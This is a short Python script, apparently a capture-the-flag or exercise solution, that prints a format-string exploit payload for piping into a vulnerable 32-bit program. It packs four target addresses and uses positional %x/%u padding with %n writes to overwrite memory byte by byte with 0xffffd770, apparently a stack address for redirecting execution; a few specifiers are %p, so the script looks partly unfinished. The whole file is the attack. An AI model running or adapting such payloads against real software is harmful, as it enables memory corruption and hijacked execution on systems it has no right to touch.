#!/usr/bin/python3
import sys, struct

str = b''
# Where: ?
# What: 0xffffd770

str += struct.pack('<I', 0x0804a014)
str += struct.pack('<I', 0x0804a015)
str += struct.pack('<I', 0x0804a016)
str += struct.pack('<I', 0x0804a017)
str += b'tt'
#str += b'%p'*252
str += b'%1$112x%119$n' # 0x70 (112) - 255
str += b'%1$103u%120$p' # 0xd7 (215) - (112+103) % 255
str += b'%1$040u%121$p' # 0xff (255) - (112+103+40) % 255
str += b'%1$256u%122$n' # 0xff (255)  - (112+103+40+256) % 255


str += b'\n'

sys.stdout.buffer.write(str)